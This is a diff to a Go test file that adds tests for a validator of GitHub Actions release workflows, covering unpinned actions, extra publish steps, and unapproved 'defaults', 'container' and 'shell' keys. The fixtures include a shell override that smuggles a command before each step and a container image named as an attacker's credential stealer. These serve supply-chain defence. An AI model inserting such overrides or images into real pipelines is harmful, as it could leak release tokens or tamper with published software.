@@ -171,6 +171,16 @@ func TestValidateWorkflowActionPinsRejectsFlowSyntax(t *testing.T) {
 	}
 }
 
+func TestValidateWorkflowActionPinsRejectsUnpinnedYAMLWorkflow(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	writeWorkflow(t, root, "ci.yml", "steps: []\n")
+	writeWorkflow(t, root, "bypass.yaml", "steps:\n  - uses: attacker/example@main\n")
+	if err := validateWorkflowActionPins(root); err == nil || !strings.Contains(err.Error(), "bypass.yaml") {
+		t.Fatalf("validateWorkflowActionPins() error = %v, want .yaml action rejection", err)
+	}
+}
+
 func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishCommand(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
@@ -186,8 +196,38 @@ func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishAction(t *testing.T) 
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n", "      - { uses: attacker/example@"+strings.Repeat("a", 40)+" }\n      - name: Publish GitHub release\n", 1)
 	writeWorkflow(t, root, "release.yml", workflow)
-	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "approved action") {
-		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want approved action rejection", err)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "exactly") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want extra action rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsPublishDefaults(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n    permissions:\n      contents: write", 1)
+	writeWorkflow(t, root, "release.yml", workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish defaults rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsPublishContainer(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    container: attacker.invalid/credential-stealer:latest\n    permissions:\n      contents: write", 1)
+	writeWorkflow(t, root, "release.yml", workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish container rejection", err)
+	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsPublicationShell(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n        env:", "      - name: Publish GitHub release\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n        env:", 1)
+	writeWorkflow(t, root, "release.yml", workflow)
+	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
+		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publication shell rejection", err)
 	}
 }
 
@@ -228,6 +268,7 @@ jobs:
         uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093
         with:
           name: release-artifacts
+          path: release-artifacts
       - name: Publish GitHub release
         env:
           GH_TOKEN: ${{ github.token }}
